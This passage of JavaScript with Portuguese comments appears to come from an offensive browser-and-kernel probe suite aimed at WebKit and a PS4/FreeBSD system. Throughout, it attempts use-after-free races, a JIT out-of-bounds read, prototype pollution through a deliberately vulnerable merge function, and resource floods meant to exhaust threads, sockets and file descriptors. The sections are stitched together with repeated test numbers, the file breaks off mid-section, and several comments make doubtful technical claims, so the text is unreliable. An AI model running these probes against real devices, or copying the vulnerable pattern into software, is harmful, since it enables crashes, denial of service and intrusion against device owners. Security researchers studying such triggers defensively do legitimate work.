                const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
                
                // Avança
                walker.nextNode(); // span A
                const node = walker.currentNode;
                
                // Remove o nó atual do DOM
                root.removeChild(node);
                
                // Tenta continuar caminhando a partir de um nó "morto"
                // O WebKit deve tratar isso, mas bugs de UAF ocorrem aqui
                walker.nextNode(); 
                
                log("TreeWalker sobreviveu à remoção do nó.", "safe");
            } catch(e) { log("Erro TreeWalker: " + e.message, "safe"); }
        }

        // TEST W3: Array.sort Proxy Side-Effect
        // Alvo: Algoritmo de Sort (QuickSort/MergeSort) em C++.
        // Usa um Proxy para redimensionar o array DURANTE a ordenação.
        function runSortConfusion() {
            log("Atacando Array.sort com Proxy...", "warn");
            try {
                const arr = [1, 2, 3, 4];
                const proxy = new Proxy(arr, {
                    get(target, prop) {
                        if (prop === "0") {
                            // O GOLPE: Encolhe o array quando o algoritmo lê o primeiro item
                            target.length = 0; 
                        }
                        return target[prop];
                    }
                });
                
                // O sort em C++ pode ter cacheado o tamanho original
                Array.prototype.sort.call(proxy);
                
                log("Sort lidou com redimensionamento.", "safe");
            } catch(e) { log("Erro Sort: " + e.message, "safe"); }
        }

        // TEST W4: Deep RegExp Compilation
        // Alvo: Stack Overflow no compilador JIT (YARR).
        // Cria uma regex com milhares de grupos aninhados.
        function runRegExpStack() {
            log("Compilando RegExp Profunda...", "warn");
            try {
                // (((((....)))))
                const depth = 5000;
                const pattern = "(".repeat(depth) + "a" + ")".repeat(depth);
                const re = new RegExp(pattern);
                
                log("RegExp compilada (Stack do compilador resistiu).", "safe");
            } catch(e) { 
                if(e.message.includes("Stack overflow") || e.name === "SyntaxError")
                    log("Stack Overflow controlado detetado.", "safe");
                else
                    log("Erro inesperado: " + e.message, "vuln");
            }
        }

        // TEST W5: Blob/FileReader State Race
        // Alvo: Gestão de estado de objetos Blob.
        function runBlobRace() {
            log("Blob Read/Revoke Race...", "warn");
            try {
                const blob = new Blob(["A".repeat(1024*1024)]);
                const url = URL.createObjectURL(blob);
                const reader = new FileReader();
                
                // Inicia leitura
                reader.readAsText(blob);
                
                // Revoga URL e fecha Blob imediatamente
                URL.revokeObjectURL(url);
                // Não há método .close() direto no Blob em JS, mas revoke afeta o sistema
                
                reader.onload = () => log("Leitura completou (Race perdida).", "safe");
                reader.onerror = () => log("Leitura falhou (Correto).", "safe");
            } catch(e) { log(e.message, "safe"); }
        }

        // ==========================================
        // KERNEL TESTS (Novos Vetores)
        // ==========================================

        // TEST K1: Pipe Buffer Exhaustion
        // Alvo: Kernel Pipe Buffers (MessageChannel usa socketpair/pipes).
        function runPipeFlood() {
            log("[KERNEL] Inundando Pipes...", "warn");
            const ch = new MessageChannel();
            
            // Envia dados massivos sem ler do outro lado
            // Isso enche o buffer do kernel pipe.
            const big = new ArrayBuffer(1024*64); // 64KB
            let i = 0;
            const iv = setInterval(() => {
                try {
                    ch.port1.postMessage(big, [big]); // Transfer
                    // Precisamos recriar o buffer pois foi transferido
                    // (Simulação de carga contínua)
                } catch(e) {
                    clearInterval(iv);
                    log("Pipe cheio ou limite de memória atingido.", "vuln");
                }
                i++;
                if(i>5000) { clearInterval(iv); log("Pipe Flood finalizado.", "safe"); }
            }, 0);
        }

        // TEST K2: Worker Signal Stack Corruption
        // Alvo: Gestão de sinais (SigAction) em threads.
        function runSignalStress() {
            log("[KERNEL] Estressando Sinais de Thread...", "warn");
            
            // Script que gera erros (sinais) propositalmente
            const blob = new Blob(["throw new Error('Boom')"], {type:'text/javascript'});
            const url = URL.createObjectURL(blob);
            
            // Spamma criação de workers que morrem instantaneamente (SIGTRAP/SIGABRT interno)
            let count = 0;
            function spam() {
                for(let i=0; i<10; i++) new Worker(url);
                count += 10;
                if(count < 500) setTimeout(spam, 10);
                else log("Signal Stress test concluído.", "safe");
            }
            spam();
        }

        // TEST K3: Kqueue Timer Filter Exhaustion
        // Alvo: Subsistema kqueue (BSD).
        // Timers usam filtros EVFILT_TIMER.
        function runKqueueTimer() {
            log("[KERNEL] Esgotando Kqueue Timers...", "warn");
            const timers = [];
            try {
                for(let i=0; i<10000; i++) {
                    // Timers com durações diferentes forçam ordenação na heap de timers do kernel
                    timers.push(setTimeout(() => {}, i));
                }
                log("10.000 Timers criados.", "safe");
            } catch(e) { log("Falha ao criar timers (Limite Kqueue): " + e.message, "vuln"); }
            
            // Limpeza
            timers.forEach(t => clearTimeout(t));
        }

        // TEST K4: WebRTC Fragmentation
        // Alvo: Mbuf Chains (Rede).
        function runNetFrag() {
            log("[KERNEL] WebRTC Network Fragmentation...", "warn");
            if(!window.RTCPeerConnection) return log("WebRTC off.", "safe");
            
            const pc = new RTCPeerConnection();
            try {
                const dc = pc.createDataChannel("frag");
                dc.onopen = () => {
                    // Envia pacotes minúsculos rapidamente
                    const tiny = new Uint8Array(1);
                    for(let i=0; i<5000; i++) dc.send(tiny);
                };
                log("DataChannel configurado.", "safe");
            } catch(e) { log("WebRTC Error: " + e.message, "safe"); }
        }

        // TEST K5: Media/Camera Driver Init Race
        // Alvo: Drivers de média (/dev/video, etc).
        function runMediaDriver() {
            log("[KERNEL] Media Driver Init/Destroy...", "warn");
            if(!navigator.mediaDevices) return log("MediaDevices off.", "safe");
            
            // Chama e cancela getUserMedia rapidamente
            // Tenta criar race na inicialização do driver de hardware
            let count = 0;
            const iv = setInterval(() => {
                const p = navigator.mediaDevices.getUserMedia({video: true, audio: true});
                // Não esperamos a promise, tentamos chamar de novo
                
                count++;
                if(count > 50) {
                    clearInterval(iv);
                    log("Media Driver Stress finalizado.", "safe");
                }
            }, 10);
        }
       // TEST W1: Map Storage Transition Race
        // O Map muda de armazenamento interno quando cresce ou muda tipos de chave.
        // Tenta corromper o armazenamento durante a transição.
        function runMapTransition() {
            log("Testando Transição de Storage de Map...", "warn");
            try {
                const m = new Map();
                // 1. Enche com chaves inteiras (armazena de forma compacta)
                for(let i=0; i<100; i++) m.set(i, i);
                
                // 2. Define getter malicioso
                const key = {
                    toString: () => {
                        // Durante a inserção, limpa o mapa para forçar desalocação
                        m.clear();
                        // Aloca lixo no lugar
                        const junk = new Array(1000).fill(1.1);
                        return "boom";
                    }
                };
                
                // 3. Insere chave complexa (força transição para Hash Map)
                m.set(key, 1337);
                
                if(m.size === 0 || m.has(key)) {
                    log("Map geriu transição/limpeza corretamente.", "safe");
                } else {
                    log("Estado do Map inconsistente após transição!", "vuln");
                }
            } catch(e) { log("Erro Map: " + e.message, "safe"); }
        }

        // TEST W2: FontFace Set Loading UAF
        // Carrega fontes inválidas para estressar o parser de fontes (FreeType/CoreText).
        function runFontFaceCrash() {
            log("Estressando Font Loader...", "warn");
            try {
                const fonts = [];
                // Cria fontes com buffers inválidos/lixo
                for(let i=0; i<50; i++) {
                    const buffer = new ArrayBuffer(1024); // Buffer vazio/lixo
                    const font = new FontFace("CrashFont"+i, buffer);
                    fonts.push(font);
                    // Adiciona e remove rapidamente
                    document.fonts.add(font);
                    font.load().catch(()=>{}); // Dispara thread de decode
                    document.fonts.delete(font); // UAF Potential
                }
                log("Fontes carregadas e descartadas.", "safe");
            } catch(e) { log("Erro Font: " + e.message, "safe"); }
        }

        // TEST W3: WebAssembly Table Import Type Confusion
        // Tenta importar uma tabela JS para Wasm com tipos incompatíveis.
        function runWasmTable() {
            if(!window.WebAssembly) return log("Wasm off.", "safe");
            log("Testando Wasm Table Imports...", "warn");
            try {
                const table = new WebAssembly.Table({initial: 1, element: "anyfunc"});
                // Tenta definir algo que não é função
                try {
                    table.set(0, {}); 
                } catch(e) {}
                
                // Importa para instância
                const mod = new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0]));
                const inst = new WebAssembly.Instance(mod, {env: {table: table}});
                
                log("Wasm Table Import seguro.", "safe");
            } catch(e) { log("Wasm Error: " + e.message, "safe"); }
        }

        // TEST W4: TreeWalker NodeFilter Object Hijack
        // O filtro do TreeWalker é uma callback JS chamada pelo C++.
        // Tenta modificar a árvore DOM DENTRO do filtro.
        function runDOMNodeFilter() {
            log("Atacando TreeWalker Filter...", "warn");
            try {
                const div = document.createElement('div');
                div.innerHTML = "<b>A</b><b>B</b>";
                
                const walker = document.createTreeWalker(div, NodeFilter.SHOW_ELEMENT, {
                    acceptNode: function(node) {
                        // O GOLPE: Remove o nó que está a ser visitado
                        if(node.tagName === 'B') {
                            div.innerHTML = ""; // Destroi todo o DOM
                            // Tenta alocar memória para ocupar o espaço
                            const arr = new Array(1000).fill(1.1);
                        }
                        return NodeFilter.FILTER_ACCEPT;
                    }
                });
                
                walker.nextNode();
                log("TreeWalker iterou com DOM modificado.", "safe");
            } catch(e) { log("Erro DOM: " + e.message, "safe"); }
        }

        // TEST W5: ReadableStream BYOB Reader Detach
        // Stream "Bring Your Own Buffer". Desliga o buffer durante a leitura.
        function runStreamDetach() {
            log("Testando Stream BYOB Reader Detach...", "warn");
            try {
                if(!window.ReadableStream) return log("Streams API off.", "safe");
                
                const buffer = new ArrayBuffer(1024);
                const rs = new ReadableStream({
                    pull(controller) {
                        // Tenta responder ao pull com o buffer
                        controller.enqueue(new Uint8Array(buffer));
                        // E desliga-o imediatamente
                        try {
                            const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                            w.postMessage(buffer, [buffer]);
                        } catch(e){}
                    }
                });
                
                const reader = rs.getReader();
                reader.read().then(() => log("Leitura segura.", "safe"))
                             .catch(() => log("Leitura segura (Erro).", "safe"));
                             
            } catch(e) { log("Erro Stream: " + e.message, "safe"); }
        }

        // ==========================================
        // KERNEL TESTS (System)
        // ==========================================

        // TEST K1: Socket Options Race (IP_OPTIONS)
        // Race condition clássica em kernels BSD ao definir opções de socket.
        function runSocketOptions() {
            log("[KERNEL] Racing Socket Options...", "warn");
            // WebSocket não expõe setsockopt diretamente, mas a criação/destruição rápida
            // estressa a limpeza de PCBs (Protocol Control Blocks).
            const sockets = [];
            const iv = setInterval(() => {
                for(let i=0; i<5; i++) {
                    const s = new WebSocket("wss://echo.websocket.org/?encoding=text");
                    s.close(); // Close imediato
                    sockets.push(s);
                }
                if(sockets.length > 50) {
                    clearInterval(iv);
                    log("Socket PCB Stress completo.", "safe");
                }
            }, 10);
        }

        // TEST K2: UMTX Op Code Fuzzing (Atomics)
        // UMTX é a syscall subjacente aos Atomics.
        // Tenta passar valores inválidos/extremos para Atomics.wait/notify.
        function runUmtxOp() {
            log("[KERNEL] Fuzzing UMTX (Atomics)...", "warn");
            if(!window.SharedArrayBuffer) return log("SAB off.", "safe");
            
            const sab = new SharedArrayBuffer(4);
            const i32 = new Int32Array(sab);
            
            // Valores que podem causar overflow interno no kernel timeout
            const timeouts = [undefined, null, -1, 0, Infinity, NaN, 4294967295];
            
            timeouts.forEach(t => {
                try {
                    Atomics.wait(i32, 0, 0, t);
                } catch(e) {}
            });
            log("UMTX syscalls executadas.", "safe");
        }

        // TEST K3: Thread Stack Guard Page Jump
        // Tenta alocar uma variável na stack tão grande que "pula" a página de guarda
        // e escreve na memória de outra thread.
        function runStackGuard() {
            log("[KERNEL] Tentando Stack Guard Jump...", "warn");
            
            const workerCode = `
                function bomb() {
                    // Tenta alocar array gigante na stack
                    // Se o stack frame for maior que a 'Red Zone', pode pular a proteção
                    try {
                        var arr = new Float64Array(5000); // ~40KB na stack
                        arr.fill(1.1);
                        bomb(); // Recursão
                    } catch(e) {}
                }
                bomb();
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            const w = new Worker(url);
            
            setTimeout(() => {
                w.terminate();
                log("Thread Stack Stress finalizado.", "safe");
            }, 2000);
        }

        // TEST K4: File Descriptor Exhaustion via Blob URLs
        // Alvo: Esgotar a tabela de ficheiros do processo kernel.
        function runFDExhaustion() {
            log("[KERNEL] Esgotando File Descriptors (Blob)...", "warn");
            const blobs = [];
            
            const iv = setInterval(() => {
                try {
                    // Cria Blob e URL (pode consumir FD ou handle interno)
                    const b = new Blob(["A"]);
                    const u = URL.createObjectURL(b);
                    blobs.push(u);
                    
                    if(blobs.length % 1000 === 0) log(`URLs criadas: ${blobs.length}`, "warn");
                } catch(e) {
                    clearInterval(iv);
                    log("Limite de recursos atingido.", "vuln");
                }
            }, 1);
            
            setTimeout(() => {
                clearInterval(iv);
                // Cleanup para recuperar o sistema
                blobs.forEach(u => URL.revokeObjectURL(u));
                log("FD Test parado.", "safe");
            }, 5000);
        }

        // TEST K5: GPU Command Buffer Overflow
        // Alvo: Driver GNM (Graphics).
        // Comandos de desenho complexos podem estourar o buffer de comandos da GPU.
        function runGPUCmd() {
            log("[KERNEL] GPU Command Buffer Overflow...", "warn");
            const c = document.createElement('canvas');
            const ctx = c.getContext('2d');
            
            // Path monstruoso
            ctx.beginPath();
            for(let i=0; i<10000; i++) {
                ctx.lineTo(Math.random()*1000, Math.random()*1000);
                ctx.bezierCurveTo(i, i, i+1, i+1, i+2, i+2);
            }
            
            try {
                // Envia para o driver
                ctx.fill(); 
                log("Comando GPU enviado (Driver resistiu).", "safe");
            } catch(e) { log("Erro GPU: " + e.message, "safe"); }
        }

        // TEST W1: AudioWorklet SharedMemory Race
        // Alvo: "acp" logs e threads de áudio.
        // O AudioWorklet roda numa thread separada. Se passarmos memória partilhada e a destruirmos
        // na main thread enquanto o áudio processa, causamos corrupção.
        function runAudioWorkletRace() {
            log("Iniciando AudioWorklet Race...", "warn");
            if (!window.AudioContext) return log("Audio API indisponível.", "safe");

            try {
                const ctx = new AudioContext();
                const blob = new Blob([`
                    registerProcessor('race-proc', class extends AudioWorkletProcessor {
                        process(inputs, outputs, parameters) {
                            // Tenta ler memória que pode ter sido libertada
                            return true;
                        }
                    });
                `], {type: 'application/javascript'});
                
                const url = URL.createObjectURL(blob);
                
                ctx.audioWorklet.addModule(url).then(() => {
                    const node = new AudioWorkletNode(ctx, 'race-proc');
                    node.connect(ctx.destination);
                    
                    // Race: Destruir contexto enquanto processa
                    setTimeout(() => {
                        ctx.close();
                        log("Contexto de Áudio fechado sob carga.", "safe");
                    }, 50);
                }).catch(e => log("Audio Worklet Error: " + e.message, "safe"));
                
            } catch(e) { log("Erro Audio: " + e.message, "safe"); }
        }

        // TEST W2: SVG SMIL Animation Element Detach
        // Alvo: DOM SVG Implementation.
        // Animações SVG (SMIL) mantêm referências a elementos. Se removermos o elemento do DOM
        // durante um callback de animação, podemos causar UAF.
        function runSVGAnimationUAF() {
            log("Testando SVG Animation Detach...", "warn");
            try {
                const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
                const rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
                const anim = document.createElementNS("http://www.w3.org/2000/svg", "set");
                
                anim.setAttribute("attributeName", "width");
                anim.setAttribute("to", "100");
                anim.setAttribute("begin", "0s");
                anim.setAttribute("dur", "1s");
                
                rect.appendChild(anim);
                svg.appendChild(rect);
                document.body.appendChild(svg);
                
                // Força layout
                svg.getBoundingClientRect();
                
                // Remove durante execução
                setTimeout(() => {
                    document.body.removeChild(svg);
                    log("SVG removido com animação ativa.", "safe");
                }, 10);
            } catch(e) { log("Erro SVG: " + e.message, "safe"); }
        }

        // TEST W3: Intl.Collator Deep Recursion
        // Alvo: Biblioteca ICU e Stack do WebKit.
        // A comparação de strings com regras complexas de localidade pode usar muita stack.
        function runIntlRecursion() {
            log("Testando Intl Recursion Stack...", "warn");
            try {
                // Locale complexo com extensões Unicode
                const collator = new Intl.Collator("ar-SA-u-co-islamic-rg-saZZZZ");
                
                const deepA = "a".repeat(20000);
                const deepB = "a".repeat(20000) + "b";
                
                // Compara strings gigantes
                collator.compare(deepA, deepB);
                
                log("Intl Collator resistiu à recursão.", "safe");
            } catch(e) { 
                if(e.message.includes("Stack")) log("Stack Overflow em ICU detectado!", "vuln");
                else log("Erro Intl: " + e.message, "safe");
            }
        }

        // TEST W4: Canvas CreatePattern Texture UAF
        // Alvo: Driver GNM e Gestão de Texturas.
        function runCanvasPattern() {
            log("Testando Canvas Pattern UAF...", "warn");
            try {
                let canvas = document.createElement('canvas');
                canvas.width = 100;
                canvas.height = 100;
                let ctx = canvas.getContext('2d');
                
                // Cria pattern baseado no canvas
                let p = ctx.createPattern(canvas, 'repeat');
                
                // Destroi o canvas fonte mudando tamanho para 0
                canvas.width = 0;
                
                // Tenta usar o pattern que referencia a textura destruída
                ctx.fillStyle = p;
                ctx.fillRect(0,0,10,10);
                
                log("Uso de Pattern após resize do source OK.", "safe");
            } catch(e) { log("Erro Pattern: " + e.message, "safe"); }
        }

        // TEST W5: Arguments Object JIT Deoptimization
        // Alvo: Compilador JIT e Stack Frame reconstruction.
        function runArgumentsDeopt() {
            log("Tentando JIT Deopt em Arguments...", "warn");
            try {
                function sensitive(a) {
                    // Acesso a arguments impede certas otimizações
                    // Mas se o JIT tentar inline e falhar...
                    return arguments.length + a;
                }
                
                function trigger() {
                    let res = 0;
                    // Hot loop para otimizar
                    for(let i=0; i<10000; i++) res += sensitive(i);
                    // Passa tipo diferente para forçar deopt
                    res += sensitive("string"); 
                    return res;
                }
                
                trigger();
                log("JIT Deoptimization segura.", "safe");
            } catch(e) { log("Erro JIT: " + e.message, "safe"); }
        }

        // ==========================================
        // KERNEL TESTS (System)
        // ==========================================

        // TEST K1: Deep Directory Recursion
        // Alvo: Kernel Stack Overflow (VFS namei).
        // Tenta criar uma estrutura de ficheiros temporários muito profunda.
        function runFileSystemRecursion() {
            log("[KERNEL] Deep FS Recursion...", "warn");
            if(!window.webkitRequestFileSystem) return log("FileSystem API off.", "safe");
            
            window.webkitRequestFileSystem(window.TEMPORARY, 1024*1024, (fs) => {
                let depth = 0;
                function dig(dir) {
                    depth++;
                    if(depth > 100) return log("FS Recursion Depth 100 atingida (Safe Limit).", "safe");
                    
                    dir.getDirectory("folder_" + depth, {create: true}, (subdir) => {
                        dig(subdir);
                    }, (e) => log("Limite Kernel FS atingido: " + e.code, "vuln"));
                }
                dig(fs.root);
            });
        }

        // TEST K2: Scheduler Runqueue Starvation
        // Alvo: _tcb_set e Scheduler do FreeBSD.
        // Cria workers que fazem "yield" (postMessage) num loop infinito apertado,
        // tentando impedir que outras threads do sistema corram.
        function runSchedulerStarvation() {
            log("[KERNEL] Starving Scheduler Runqueue...", "warn");
            const blob = new Blob([`onmessage=e=>{ while(true) postMessage("yield"); }`], {type:'text/javascript'});
            const url = URL.createObjectURL(blob);
            
            const workers = [];
            // Cria número de workers igual ou superior aos cores lógicos do PS4 (8)
            for(let i=0; i<12; i++) {
                const w = new Worker(url);
                w.onmessage = () => {}; // Drain events
                w.postMessage("start");
                workers.push(w);
            }
            
            setTimeout(() => {
                workers.forEach(w => w.terminate());
                log("Scheduler Stress finalizado.", "safe");
            }, 3000);
        }

        // TEST K3: Shared Memory Object Name Probing
        // Alvo: sys_mname e nomes de SHM encontrados nos binários (ex: jit_shm).
        // Como não temos shm_open direto, tentamos criar objetos grandes que forçam
        // o kernel a interagir com o subsistema VM.
        function runShmOpenAttempt() {
            log("[KERNEL] Probing Shared Memory Limits...", "warn");
            try {
                // SharedArrayBuffer mapeia memória anónima
                // Tentamos alocar múltiplos buffers grandes para fragmentar o mapa VM do kernel
                const shms = [];
                for(let i=0; i<50; i++) {
                    // 2MB (Large Page size)
                    shms.push(new SharedArrayBuffer(2 * 1024 * 1024));
                }
                log("100MB Shared Memory alocados.", "safe");
            } catch(e) { log("Falha SHM (Limite VM atingido): " + e.message, "vuln"); }
        }

        // TEST K4: PID Table Exhaustion
        // Alvo: Esgotar a tabela de processos/threads do sistema.
        function runPidExhaustion() {
            log("[KERNEL] PID/Thread Table Exhaustion...", "warn");
            const workers = [];
            let count = 0;
            const iv = setInterval(() => {
                try {
                    // Tenta criar workers até falhar
                    const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                    workers.push(w);
                    count++;
                    if(count % 50 === 0) log(`Threads: ${count}`, "warn");
                } catch(e) {
                    clearInterval(iv);
                    // Limpa tudo
                    workers.forEach(w => w.terminate());
                    log("Limite de Threads atingido (Safe Fail).", "safe");
                }
                // Safety break
                if(count > 500) { clearInterval(iv); workers.forEach(w=>w.terminate()); log("Teste abortado (Limite de segurança).", "safe"); }
            }, 5);
        }

        // TEST K5: Kernel Zone Allocator Fragmentation
        // Alvo: UMA (Universal Memory Allocator) do FreeBSD.
        // Usa pacotes UDP (via WebRTC/Stun) de tamanhos variados para fragmentar as 'zones' de rede.
        function runZoneAllocFrag() {
            log("[KERNEL] Fragmenting Network Zones...", "warn");
            if(!window.RTCPeerConnection) return log("WebRTC off.", "safe");
            
            const pc = new RTCPeerConnection({
                iceServers: [{urls: "stun:stun.l.google.com:19302"}]
            });
            
            // A criação de candidatos ICE gera tráfego UDP
            pc.onicecandidate = (e) => {};
            pc.createDataChannel("frag");
            pc.createOffer().then(o => pc.setLocalDescription(o));
            
            // Recriação rápida para churn de sockets
            let i = 0;
            const iv = setInterval(() => {
                try {
                    const temp = new RTCPeerConnection();
                    temp.close();
                } catch(e){}
                i++;
                if(i > 100) { clearInterval(iv); log("Zone Allocator Stress finalizado.", "safe"); }
            }, 20);
        }
 // TEST W1: Bounds Check Elimination (BCE)
        // Alvo: Otimizador DFG/FTL do JIT.
        // Tenta enganar o JIT para remover a verificação de limites do array.
        function runBCE() {
            log("Iniciando JIT Bounds Check Elimination...", "info");
            
            const arr = [1.1, 2.2, 3.3];
            arr.ok = 1; // Força estrutura complexa
            
            // Função quente para JIT
            function trigger(a, i) {
                // Padrão confuso: Math.max limitaria o index, mas se o JIT errar a inferência de range...
                // Se i for maior que length, mas o JIT achar que é menor, lê OOB.
                let idx = Math.max(0, i); 
                if (idx < a.length) {
                    return a[idx]; // Acesso seguro aparente
                }
                return 0; // Fallback
            }
            
            // 1. Treina o JIT com inputs válidos
            for (let i = 0; i < 100000; i++) trigger(arr, 0);
            
            // 2. Trigger OOB
            // Passa um index fora dos limites. Se o BCE removeu o check...
            const res = trigger(arr, 100); 
            
            if (res !== undefined && res !== 0) {
                log(`BCE Sucesso! Leu OOB: ${d2h(res)}`, "vuln");
            } else {
                log("Bounds Check mantido pelo JIT.", "safe");
            }
        }

        // TEST W2: History State Structured Clone Confusion
        // Alvo: Serializador de Objetos.
        // History API usa "Structured Clone". Se modificarmos o objeto DURANTE a clonagem...
        function runHistoryState() {
            log("Testando History State Clone Logic...", "info");
            try {
                const state = {
                    get a() {
                        // Mutação lateral durante clonagem
                        // Tenta invalidar o cache do serializador
                        this.b = { complex: "structure" }; 
                        return 1;
                    },
                    b: 2
                };
                
                // PushState força serialização profunda
                history.pushState(state, "", "");
                
                // Lê de volta
                const restored = history.state;
                
                if (restored.b === 2) {
                    log("Serialização segura.", "safe");
                } else {
                    log("Estado corrompido durante clonagem!", "vuln");
                }
            } catch(e) { log("History Error: " + e.message, "safe"); }
        }

        // TEST W3: Proxy.reflect Trap Type Confusion
        // Alvo: Proxy handlers internos.
        function runProxyReflect() {
            log("Testando Proxy Reflect Trap...", "info");
            try {
                const target = {x: 1};
                const proxy = new Proxy(target, {
                    get(t, p, r) {
                        // Retorna algo inesperado para o motor (ex: muda tipo de retorno)
                        return Reflect.get(t, p, r);
                    }
                });
                
                // Força otimização de acesso a propriedade em Proxy
                function access(p) { return p.x; }
                for(let i=0; i<10000; i++) access(proxy);
                
                log("Proxy Reflect otimizado corretamente.", "safe");
            } catch(e) { log("Erro Proxy: " + e.message, "safe"); }
        }

        // TEST W4: String.replace JIT Side-Effect
        // Alvo: RegExp Engine.
        // A função de substituição pode causar efeitos colaterais que invalidam strings.
        function runStringReplaceJIT() {
            log("Testando String.replace Side-Effects...", "info");
            const str = "foo";
            const ptrn = /foo/;
            
            const res = str.replace(ptrn, () => {
                // Side effect: Tenta invalidar a string original ou heap associado
                // (Conceitual em JS puro, mas crítico para o motor)
                return "bar";
            });
            
            if (res === "bar") log("Replace executado sem corrupção.", "safe");
            else log("Resultado inesperado no replace.", "vuln");
        }

        // TEST W5: Symbol.hasInstance Check Bypass
        // Alvo: Verificação de tipo 'instanceof'.
        function runInstanceOfCheck() {
            log("Testando Symbol.hasInstance...", "info");
            class Evil {
                static [Symbol.hasInstance](instance) {
                    // Retorna true sempre, tenta enganar validações internas C++
                    // que confiam em instanceof para segurança de tipo (Type Confusion)
                    return true;
                }
            }
            
            const x = {};
            if (x instanceof Evil) {
                // Comportamento JS correto, mas testamos se isso causa crash interno
                // ao passar 'x' para função que espera 'Evil' real
                log("Check de instância manipulado (Lógica JS OK).", "safe");
            }
        }

        // ==========================================
        // KERNEL TESTS (Logic & Race - No Panic)
        // ==========================================

        // TEST K1: Unix Domain Socket GC Race
        // Alvo: Garbage Collection de descritores de arquivo (FDs).
        // Enviar um socket através de si mesmo cria um ciclo que o Kernel GC deve limpar.
        function runUnixSocketRace() {
            log("[KERNEL] Unix Socket GC Stress...", "info");
            const ch = new MessageChannel();
            
            // Cria ciclo de referência no kernel IPC
            // Port1 segura Port2, Port2 segura Port1
            ch.port1.postMessage("cycle", [ch.port2]);
            
            // Se fizermos isso massivamente e fecharmos, o GC do kernel trabalha.
            // Race condition aqui leva a UAF de descritor, não crash imediato.
            const junk = [];
            for(let i=0; i<100; i++) {
                const c = new MessageChannel();
                c.port1.postMessage("cycle", [c.port2]);
                junk.push(c);
            }
            
            // Limpeza
            junk.length = 0; // Trigger GC JS -> Trigger Close FD -> Trigger Kernel GC
            
            log("Ciclos IPC criados e descartados.", "safe");
        }

        // TEST K2: Semaphore Count Logical Overflow
        // Alvo: Primitivas de Sincronização.
        // Tenta incrementar um contador atómico partilhado até dar overflow (wrap around).
        function runSemaphoreOverflow() {
            log("[KERNEL] Semaphore Logic Test...", "info");
            if(!window.SharedArrayBuffer) return log("SAB off.", "safe");
            
            const sab = new SharedArrayBuffer(4);
            const view = new Int32Array(sab);
            
            // Define valor perto do limite máximo de Int32
            view[0] = 2147483640; 
            
            // Tenta 'add' atómico para causar overflow para negativo
            for(let i=0; i<20; i++) {
                Atomics.add(view, 0, 1);
            }
            
            if (view[0] < 0) {
                log(`Overflow Lógico em Atomics: ${view[0]} (Comportamento esperado, mas testando limites do Kernel futex)`, "safe");
            } else {
                log("Sem overflow.", "safe");
            }
        }

        // TEST K3: MSG_PEEK Stack Info Leak
        // Alvo: Implementação de socket recvmsg.
        // MSG_PEEK olha dados sem remover. Se o buffer kernel não for inicializado...
        function runRecvMsgPeek() {
            log("[KERNEL] Socket MSG_PEEK Logic...", "info");
            const ws = new WebSocket("wss://echo.websocket.org");
            
            ws.onopen = () => {
                ws.send("A"); // Envia 1 byte
                // O kernel bufferiza. A leitura subsequente deve ser exata.
                // Se conseguíssemos ler mais do que 1 byte (via bug lógico em buffer size),
                // leríamos stack do kernel.
                // Em JS, verificamos se recebemos lixo extra.
            };
            
            ws.onmessage = (e) => {
                if (e.data.length !== 1) {
                    log(`Leak Potencial! Recebido ${e.data.length} bytes (esperado 1).`, "vuln");
                } else {
                    log("Socket buffer size respeitado.", "safe");
                }
                ws.close();
            };
        }

        // TEST K4: writev/readv Iovec Length Underflow
        // Alvo: Syscalls de IO vetorial.
        // Blob construction usa vetores de dados.
        function runIovecUnderflow() {
            log("[KERNEL] Iovec Length Logic...", "info");
            try {
                // Cria array de Blobs vazios para gerar iovec com lengths zero
                const parts = [];
                for(let i=0; i<1000; i++) parts.push(new ArrayBuffer(0));
                
                const blob = new Blob(parts); // Kernel processa lista de vetores
                
                // Lê de volta. Se o kernel se confundir com tantos segmentos vazios...
                blob.text().then(t => {
                    if (t.length === 0) log("Iovec zero-length tratado corretamente.", "safe");
                    else log("Iovec corrupto: dados lidos de buffers vazios!", "vuln");
                });
            } catch(e) { log("Erro Blob: " + e.message, "safe"); }
        }

        // TEST K5: Kqueue Nested Filter Logic
        // Alvo: Sistema de Eventos.
        // Cria complexidade na fila de eventos sem crashar.
        function runKqueueNest() {
            log("[KERNEL] Kqueue Logic Stress...", "info");
            // Promise chains longas criam microtarefas que interagem com o event loop (kqueue)
            let p = Promise.resolve();
            for(let i=0; i<5000; i++) {
                p = p.then(() => 1);
            }
            p.then(() => log("Kqueue drain completo sem stall.", "safe"));
        }
        // TEST W1: JIT Integer Truncation
        // Tenta enganar o JIT para truncar um número incorretamente (ex: 32bit vs 64bit).
        // Isso resulta num cálculo errado, não num crash.
        function runJITTruncation() {
            log("Testando Lógica de Truncamento JIT...", "info");
            
            function opt(x) {
                // Math.imul emula multiplicação 32-bit C-style
                // Se o JIT otimizar mal valores grandes, o resultado difere
                return Math.imul(x, 0x10000001) | 0;
            }
            
            // Treino
            for(let i=0; i<100000; i++) opt(10);
            
            // Valor de borda
            const res = opt(0x80000000); 
            
            // 0x80000000 * ... deve ser negativo em 32-bit signed
            if (res > 0) {
                log(`Erro Lógico JIT detectado! Resultado: ${res}`, "vuln");
            } else {
                log("Cálculo JIT correto.", "safe");
            }
        }

        // TEST W2: Object Prototype Pollution
        // Verifica se é possível injetar propriedades no Object.prototype base.
        // Crítico para segurança web, aceito em bounties.
        function runPrototypePollution() {
            log("Testando Prototype Pollution...", "info");
            try {
                // Simula payload JSON malicioso
                const payload = JSON.parse('{"__proto__": {"polluted": true}}');
                
                // Tenta merge (padrão comum em libs vulneráveis)
                function merge(target, source) {
                    for (let key in source) {
                        if (typeof source[key] === 'object') {
                            merge(target[key], source[key]);
                        } else {
                            target[key] = source[key];
                        }
                    }
                }
                
                const obj = {};
                merge(obj, payload);
                
                // Verifica se um objeto não relacionado foi afetado
                const test = {};
                if (test.polluted === true) {
                    log("PROTOTYPE POLLUTION CONFIRMADO!", "vuln");
                    delete Object.prototype.polluted; // Cleanup
                } else {
                    log("Prototype seguro contra poluição simples.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // TEST W3: Cache Timing Side-Channel (Spectre-Lite)
